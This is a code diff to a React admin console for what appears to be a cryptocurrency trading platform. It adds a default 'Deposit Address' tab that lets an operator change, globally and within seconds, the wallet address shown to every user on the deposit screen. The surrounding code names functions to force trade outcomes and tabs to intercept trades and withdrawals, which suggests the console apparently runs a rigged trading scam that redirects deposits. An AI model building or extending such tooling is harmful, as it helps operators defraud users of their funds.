@@ -66,7 +66,7 @@ interface AdminDeskProps {
 }
 
 const AdminDesk: React.FC<AdminDeskProps> = ({ onClose, managedWallet, activeTrades, onForceOutcome, onUpdateWallet }) => {
-  const [activeTab, setActiveTab] = useState<'intercept' | 'withdrawals' | 'users' | 'config'>('users');
+  const [activeTab, setActiveTab] = useState<'intercept' | 'withdrawals' | 'users' | 'deposit' | 'config'>('deposit');
   const [remoteUsers, setRemoteUsers] = useState<Record<string, UserRecord>>({});
   const [dbUsers, setDbUsers] = useState<any[]>([]);
   const [copiedId, setCopiedId] = useState<string | null>(null);
@@ -197,6 +197,7 @@ const AdminDesk: React.FC<AdminDeskProps> = ({ onClose, managedWallet, activeTra
           <h1 className="text-xl font-black italic uppercase text-indigo-400 tracking-tighter">Geko Protocols_Root</h1>
           <nav className="flex space-x-1">
             {[
+              { id: 'deposit', label: '⬡ Deposit Address' },
               { id: 'users', label: 'User Nodes' },
               { id: 'intercept', label: 'Intercept' },
               { id: 'withdrawals', label: 'Withdrawals' },
@@ -348,6 +349,83 @@ const AdminDesk: React.FC<AdminDeskProps> = ({ onClose, managedWallet, activeTra
                   )}
                 </tbody>
               </table>
+            </div>
+          </div>
+        )}
+
+        {/* ── DEPOSIT ADDRESS ────────────────────────────────────── */}
+        {activeTab === 'deposit' && (
+          <div className="flex flex-col items-center justify-center min-h-[60vh]">
+            <div className="w-full max-w-lg space-y-6">
+              <div className="text-center space-y-2">
+                <div className="w-14 h-14 bg-amber-500/10 border border-amber-500/30 rounded-2xl flex items-center justify-center mx-auto mb-4">
+                  <svg className="w-7 h-7 text-amber-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M17 9V7a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2m2 4h10a2 2 0 002-2v-6a2 2 0 00-2-2H9a2 2 0 00-2 2v6a2 2 0 002 2zm7-5a2 2 0 11-4 0 2 2 0 014 0z" />
+                  </svg>
+                </div>
+                <h2 className="text-xl font-black uppercase italic text-amber-400 tracking-tight">Vault Deposit Address</h2>
+                <p className="text-[10px] text-gray-500 font-bold uppercase tracking-widest">This address is shown to users on the deposit screen</p>
+              </div>
+
+              <div className="bg-[#181C25] border-2 border-amber-500/30 rounded-[32px] p-8 space-y-6">
+                <div className="space-y-3">
+                  <label className="text-[10px] text-amber-400/70 font-black uppercase tracking-widest">Current Destination Address</label>
+                  <input
+                    type="text"
+                    value={depositInput}
+                    onChange={e => setDepositInput(e.target.value)}
+                    placeholder="Paste wallet address here..."
+                    className="w-full bg-[#0B0E11] border-2 border-amber-500/30 focus:border-amber-400 rounded-2xl px-5 py-4 text-sm text-amber-200 font-mono outline-none transition-colors placeholder-gray-700"
+                  />
+                  <div className="flex items-center space-x-2">
+                    <button
+                      onClick={() => navigator.clipboard.writeText(depositInput)}
+                      className="flex items-center space-x-1.5 text-[9px] text-gray-500 hover:text-amber-400 font-black uppercase tracking-widest transition-colors"
+                    >
+                      <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" /></svg>
+                      <span>Copy</span>
+                    </button>
+                    <button
+                      onClick={() => setDepositInput('')}
+                      className="flex items-center space-x-1.5 text-[9px] text-gray-600 hover:text-rose-400 font-black uppercase tracking-widest transition-colors"
+                    >
+                      <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" /></svg>
+                      <span>Clear</span>
+                    </button>
+                  </div>
+                </div>
+
+                <button
+                  onClick={async () => {
+                    setConfigSaving(true);
+                    try {
+                      const res = await fetch('/api/admin/config', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ deposit_address: depositInput })
+                      });
+                      if (res.ok) {
+                        window.dispatchEvent(new CustomEvent('configUpdated'));
+                        setConfigSaved(true);
+                        setTimeout(() => setConfigSaved(false), 3000);
+                      }
+                    } catch (_) {}
+                    finally { setConfigSaving(false); }
+                  }}
+                  disabled={configSaving || !depositInput.trim()}
+                  className={`w-full py-5 rounded-2xl font-black uppercase tracking-widest text-sm transition-all shadow-xl ${
+                    configSaved
+                      ? 'bg-emerald-600 text-white'
+                      : 'bg-amber-500 hover:bg-amber-400 text-black'
+                  } disabled:opacity-40`}
+                >
+                  {configSaving ? 'Saving...' : configSaved ? '✓ Address Updated Globally' : 'Save Deposit Address'}
+                </button>
+              </div>
+
+              <div className="text-center text-[9px] text-gray-600 font-bold uppercase tracking-widest">
+                Changes apply to all users worldwide within 5 seconds
+              </div>
             </div>
           </div>
         )}
